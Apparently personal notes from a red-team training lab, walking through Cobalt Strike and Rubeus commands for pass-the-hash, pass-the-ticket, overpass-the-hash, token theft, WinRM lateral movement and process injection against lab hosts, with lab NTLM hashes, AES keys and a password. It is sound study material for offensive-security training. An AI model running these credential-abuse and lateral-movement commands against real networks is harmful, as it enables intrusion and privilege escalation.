## Passing the Hash
Used in the system shell I had, the beacon input translates to mimikatz pth command
```powershell
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
```
![[Pasted image 20230828141910.png]]
Checking to see if we are able to see the C$ drive on computers that John King is Local Admin's of in the Support Engineers group.
```powershell
beacon> ls \\web.dev.cyberbotic.io\c$
```
![[Pasted image 20230828142333.png]]
```powershell
beacon> ls \\sql-2.dev.cyberbotic.io\c$
```
![[Pasted image 20230828142351.png]]
Both were successful, so PTH is working.

To "drop" impersonation afterwards, use the `rev2self` command.
## Passing the Ticket
Rubeus' `createnetonly` command will start a new hidden process of our choosing, using the [CreateProcessWithLogonW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) API.
Created cmd.exe process to inject KRBTGT into
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
```
Running this command to grab the LUID of the user logged in as ( John King )
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```
![[Pasted image 20230828164029.png]]
How to get base64 key
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x4b136 /service:krbtgt
```
![[Pasted image 20230828164249.png]]
Run a `ps` to get PID of the very first command ran in PASSING the TICKET and take note of it to inject key into.
![[Pasted image 20230828164439.png]]
Passing the Ticket 
Passed the ticket into the luid of john king
```powershell
beacon >execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x4b136 /ticket:doIFuj[...snip...]lDLklP
```
![[Pasted image 20230828165855.png]]
running this command now shows thje krbtgt running in the new LUID we created with jking
```powershell
beacon > execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```
![[Pasted image 20230828170025.png]]
Steal the token of the created cmd.exe we are now NT AUTH SYSTEM.
```powershell
beacon > steal_token 22612
```
![[Pasted image 20230828171051.png]]
Reverted Token with 
```powershell
beacon> rev2self
```
& killed process with 
```powershell
beacon> kill 22612
```
## Overpass The Hash
Another way to get base64 encoded ticket if we already have ntlm hashes.
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap
```
![[Pasted image 20230828171915.png]]
In order to obtain the TGT encrypted using AES256 encryption instead use this command utilizing the AES256 jking credentials stored in cobalt strike previously - use this method to stay more quiet.
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap
```
![[Pasted image 20230828172305.png]]


```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```
![[Pasted image 20230828172735.png]]
Overpass the hash is a technique which allows us to request a Kerberos TGT for a user, using their NTLM or AES hash.

## Token Impersonation
Essentially stealing token of a process that is running as someone that we want to impersonate.
mmc.exe is running as dev\jking, we can impersonate this.
```powershell
ps
```
![[Pasted image 20230828174020.png]]
Impersonated jking
```powershell
beacon> steal_token 4444
```
![[Pasted image 20230828174318.png]]

## Token Store
Can store tokens
```powershell
token-store steal 4444
```
![[Pasted image 20230828174528.png]]

## Make Token
Can make tokens if you know the plaintext credentials.
```powershell
beacon> make_token DEV\jking Qwerty123
```
If credentials are known can be used to laterally move through winrm
```powershell
beacon> remote-exec winrm web.dev.cyberbotic.io whoami
dev\jking
```
![[Pasted image 20230828174941.png]]
## Process Injection
Injected into mmc.exe process.
```powershell
beacon> inject 4444 x64 tcp-local
```

![[Pasted image 20230828175306.png]]